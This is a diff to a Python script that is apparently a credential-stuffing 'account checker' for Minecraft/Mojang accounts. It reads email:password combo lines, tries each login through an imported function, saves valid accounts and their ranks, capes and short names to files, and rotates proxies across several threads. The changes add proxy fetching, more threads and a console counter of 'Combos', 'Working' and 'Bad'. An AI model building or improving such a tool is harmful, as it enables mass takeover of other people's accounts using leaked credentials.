@@ -1,13 +1,20 @@
-from stuff.account_checker import *
+from stuff.checker import *
 from stuff.cape_checker import *
 from stuff.special_checker import *
 from stuff.file_creator import *
 from stuff.config_reader import *
 from multiprocessing.dummy import Pool as ThreadPool
+from pyfiglet import Figlet
+from termcolor import colored
+import platform
+from stuff import checker
 create_files()
 account_file_lines = open(BASIC_PATH + os.sep + 'accounts.txt').read().split('\n')
 threads = Checker.Threads.thread_amount
-
+windows = False
+if platform.system() == "Windows":
+    import ctypes
+    windows = True
 
 class Counter:
     valid = 0
@@ -24,13 +31,16 @@ class Counter:
     mineplexrank = 0
 
 
+checker.proxy_getter()
+
+
+
 def check(x):
     if not account_file_lines[x].__contains__(':'):
         pass
     email_username = account_file_lines[x].split(':', 1)[0]
     password = account_file_lines[x].split(':', 1)[1]
     answer = account_login(email_username=email_username, password=password)
-
     if not str(answer).__contains__('Invalid credentials'):
         uuid = answer["availableProfiles"][0]["id"]
         username = answer["availableProfiles"][0]["name"]
@@ -86,13 +96,17 @@ def check(x):
             open(FOLDER_PATH + os.sep + 'special_name.txt', 'a').write(account_file_lines[x] + "\n")
             Counter.shortname += 1
 
-        print("Valid account " + username)
+        print(colored("Valid account " + username, "green"))
     else:
-        print('Invalid Account')
+        print(colored('Invalid account', "red"))
         Counter.invalid += 1
+    if windows:
+        ctypes.windll.kernel32.SetConsoleTitleW(
+            "Combos: " + str(len(account_file_lines)) +
+            " | Working: " + str(Counter.valid) +
+            " | Bad: " + str(Counter.invalid))
 
-
-def theads_two(numbers, threads=1):
+def theads_two(numbers, threads=7):
     pool = ThreadPool(threads)
     results = pool.map(check, numbers)
     pool.close()
